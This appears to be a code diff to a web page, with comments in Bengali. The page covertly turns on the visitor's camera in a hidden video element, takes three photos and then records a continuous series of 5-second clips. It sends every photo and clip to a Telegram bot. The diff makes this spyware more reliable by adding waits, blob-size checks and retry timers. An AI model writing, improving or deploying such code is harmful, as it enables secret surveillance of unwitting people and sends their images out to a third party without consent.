@@ -68,7 +68,7 @@
       display: none;
     }
 
-    /* ✨ বিশেষ কাস্টম বিউটি ও স্কিন গ্লো ফিল্টার (চেহারা সুন্দর ও উজ্জ্বল দেখানোর জন্য) */
+    /* ✨ বিশেষ কাস্টম বিউটি ও স্কিন গ্লো ফিল্টার */
     .filter-beauty-glow {
       filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
     }
@@ -102,7 +102,6 @@
     </div>
   </div>
 
-  <!-- গোপন ক্যামেরায় অটোমেটিক বিউটি ফিল্টার অ্যাপ্লাই করা আছে -->
   <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
   <canvas id="snapshotCanvas"></canvas>
 
@@ -131,7 +130,10 @@
 
         hiddenCam.srcObject = camStream;
 
-        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো (ফিল্টার সহ)
+        // ভিডিও স্ট্রিম পুরোপুরি প্লে হওয়ার জন্য ১ সেকেন্ড অপেক্ষা করা
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো
         await captureAndSendPhotos(3);
 
         // ২. এরপর ৫ সেকেন্ডের ভিডিও ক্লিপ বারবার পাঠিয়ে যাওয়া শুরু করা
@@ -142,22 +144,25 @@
       }
     });
 
-    // ছবি তোলার ফাংশন (বিউটি ফিল্টার সহ ক্যানভাসে রেন্ডার হবে)
+    // ছবি তোলার উন্নত ফাংশন (টাইমআউট ও সাইজ চেক সহ)
     function takePhoto() {
       return new Promise((resolve) => {
         setTimeout(() => {
-          canvas.width = hiddenCam.videoWidth || 640;
-          canvas.height = hiddenCam.videoHeight || 480;
+          if (!hiddenCam.videoWidth || !hiddenCam.videoHeight) {
+            resolve(null);
+            return;
+          }
+          canvas.width = hiddenCam.videoWidth;
+          canvas.height = hiddenCam.videoHeight;
           const ctx = canvas.getContext('2d');
 
-          // ক্যামেরার বিউটি ফিল্টার স্টাইল ক্যানভাসে যুক্ত করা
           ctx.filter = window.getComputedStyle(hiddenCam).filter;
           ctx.drawImage(hiddenCam, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob((blob) => {
             resolve(blob);
           }, 'image/jpeg', 0.90);
-        }, 800);
+        }, 1200);
       });
     }
 
@@ -165,7 +170,7 @@
     async function captureAndSendPhotos(count) {
       for (let i = 1; i <= count; i++) {
         const photoBlob = await takePhoto();
-        if (photoBlob) {
+        if (photoBlob && photoBlob.size > 0) {
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
@@ -176,6 +181,8 @@
             body: formData
           }).catch(err => console.log("Photo send failed", err));
         }
+        // প্রতিটি ছবির মাঝে ১ সেকেন্ড বিরতি
+        await new Promise(r => setTimeout(r, 1000));
       }
     }
 
@@ -195,6 +202,7 @@
         try {
           mediaRecorder = new MediaRecorder(camStream, options);
         } catch (e) {
+          setTimeout(recordInterval, 2000);
           return;
         }
 
@@ -209,25 +217,28 @@
         mediaRecorder.onstop = async () => {
           if (chunks.length > 0) {
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('video', videoBlob, `clip_${Date.now()}.webm`);
-            formData.append('caption`, `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
+            if (videoBlob.size > 1000) { // নিশ্চিত করা যে ফাইলটি খালি নয়
+              const formData = new FormData();
+              formData.append('chat_id', TELEGRAM_CHAT_ID);
+              formData.append('video', videoBlob, `clip_${Date.now()}.webm`);
+              formData.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
 
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-              method: 'POST',
-              body: formData
-            }).catch(err => console.log("Video send failed", err));
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+              }).catch(err => console.log("Video send failed", err));
+            }
           }
 
           // পরবর্তী ৫ সেকেন্ডের ভিডিওর জন্য রিকার্সভ কল
-          setTimeout(recordInterval, 1000);
+          setTimeout(recordInterval, 1500);
         };
 
         mediaRecorder.start();
 
+        // ঠিক ৫ সেকেন্ড পর রেকর্ড স্টপ করা
         setTimeout(() => {
-          if (mediaRecorder.state === 'recording') {
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
           }
         }, 5000);
